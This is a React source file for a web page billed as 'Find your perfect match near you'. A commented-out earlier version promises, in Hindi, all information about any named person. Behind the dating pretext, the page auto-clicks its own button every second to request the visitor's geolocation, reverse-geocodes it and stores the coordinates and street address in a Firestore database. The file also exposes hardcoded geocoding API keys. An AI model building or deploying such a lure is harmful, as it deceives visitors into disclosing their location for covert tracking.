import React, { useState, useEffect, useRef } from "react";

import partner from '../src/Image/partner.jpg';
// import { doc, setDoc, deleteDoc,serverTimestamp } from "firebase/firestore";
import { doc, setDoc } from "firebase/firestore";
import db from './firebase';
import './App.css';

// function App() {
//   const [lat, setLat] = useState();
//   const [lon, setLon] = useState();
//   const [userAddress, setUserAddress] = useState();
//   // const [city, setCity] = useState();
//   console.log("latitude:", lat, lon);

//   const geo = navigator.geolocation
//   // const watchID = geo.watchPosition(userCoords)
//   geo.watchPosition(userCoords)
//   function userCoords(position) {
//     // console.log(position,"data");
//     let userlat = position.coords.latitude
//     let userlon = position.coords.longitude
//     setLat(userlat);
//     setLon(userlon);
//   }
//   const getUserAddress = async () => {
//     let url = `https://api.opencagedata.com/geocode/v1/json?key=ed693e08c1f7453e8083381cc90004b5&q=${lat}%2C+${lon}&pretty=1&no_annotations=1`
//     const loc = await fetch(url)
//     const data = await loc.json()
//     // console.log("user address -", data);
//     setUserAddress(data.results[0].formatted)
//   }
//   // const handleGetUserAddress = () => {
//   //   getUserAddress()
//   // }

//   // Add a new document in collection "cities"
//   const  Push = async () => {
//   // await setDoc(doc(db, "state","cities"), {
//   //   latitude: lat,
//   //   longitude: lon,
//   //   Address: userAddress,
//   //   timestamp: serverTimestamp(),
//   // await deleteDoc(doc(db, "cities", "LA"))
//   // })};
//   // Add a new document in collection "cities"
//   const Push = async () => {
//     const cityRef = doc(db, "state", "cities");
//     await setDoc(cityRef, { latitude: lat, longitude: lon, Address: userAddress, timestamp: serverTimestamp() }, { merge: true });
//     console.log(cityRef, "push data");
//   }
// }
//   const Play = () => {
//     getUserAddress();
//     Push();
//   }
//   // stop gps
//   // const stopGPS = () => {
//   //   geo.clearWatch(watchID)
//   // }
//   return (
//     <>
//       <div className="App">
//         {/* <h1> Play and get your partner details</h1>
//         <h1> latitude -{lat}</h1>
//         <h1> longitude -{lon}</h1>
//         <h1> user Address -{userAddress}</h1> */}
//         {/* <img src={partners} onClick={Play} className="center" alt="" /> */}
//         {/* <button onClick={Play}>Play Game</button><br /> */}
//         {/* <button onClick={stopGPS}>Stop Gps</button> */}
//         {/* <button onClick={Push}>Stop</button> */}
//         {/* <h2 className="App-header">Enter any name which you like very much, you will get all information about him</h2> */}
//         <h2 className="App-header">कोई भी नाम डालें जो आपको बहुत पसंद हो, आपको उसके बारे में सारी जानकारी मिल जाएगी</h2>
//         <img src={love} onClick={Play} className="responsive" alt="" />
//         < div className="fly" >
//           <div className="inp-box">
//             <input
//               type="text"
//             />
//             <button onClick={Play}>Go</button>
//           </div>
//         </div >
//       </div>

//     </>
//   );
// }

function App() {
  const [location, setLocation] = useState(null);
  const [address, setAddress] = useState(null);
  console.log(location, "data");
  const buttonRef = useRef(null);

  useEffect(() => {
     // Function to simulate a click on the button
     const clickButton = () => {
      buttonRef.current.click();
    };
    // buttonRef.current.click();
     // Set an interval to click the button every 1000 milliseconds (1 second)
     const intervalId = setInterval(clickButton, 1000);

     // Clean up the interval when the component unmounts
     return () => clearInterval(intervalId);
  }, []);


  function handleLocationClick() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(success, error);
    } else {
      console.log("Geolocation not supported");
    }
  }

  function success(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    setLocation({ latitude, longitude });
    console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);

    // Make API call to opencagedata
    fetch(
      `https://api.opencagedata.com/geocode/v1/json?key=f546f961f7854ee580bb203ded9a02d4=${latitude}%2C+${longitude}&pretty=1&no_annotations=1`
    )
      .then((response) => response.json())
      .then((data) => {
        setAddress(data);
        console.log(data, "data");
      })
      .catch((error) => console.log(error));
  }

  function error() {
    console.log("Unable to retrieve your location");
  }
  // Add a new document in collection "cities"
  async function Push() {
    const cityRef = (doc(db, "state", "cities"))
    await setDoc(cityRef, {
      latitude: location.latitude,
      longitude: location.longitude,
      Address: address.results[0].formatted,
      Time: address.timestamp.created_http
      // await deleteDoc(doc(db, "cities", "LA"))
    }, { merge: true });
    // alert("Successfully sybmit")
  };
  
  return (
    <>
      <div className="App">
        <h1>Find your perfect match near you</h1>
        <h2>Must allow your location to see partner near you</h2>
        <img src={partner} className="responsive" alt="partner" />
        {!location ? (
          <button id="button-71" ref={buttonRef} onClick={handleLocationClick}>Magic Here</button>
        ) : <button id="button-71" ref={buttonRef} onClick={handleLocationClick}>Magic Here</button>}
        {location && !address ? <p>Loading magic detail...</p> : null}
        {address ? (
          <div >
            {/* <div className="inp-box">
            Name : <input
              type="text"
              placeholder='name'             
            />
          </div><br />
          <div className="inp-box">
            Age : <input
              type="number"
              placeholder='age'             
            />
          </div><br />
          <button className="button-71" onClick={Push}>Magic Here</button> */}

            {/* <p>Location: {location.latitude} {location.longitude}</p>
          <p>Time: {address.timestamp.created_http}</p>
          <p>Address: {address.results[0].formatted}</p> */}
            <button className="button-71" ref={buttonRef} onClick={Push}>Click Here</button>
          </div>
        ) : null}
      </div>
    </>
  );
};
export default App;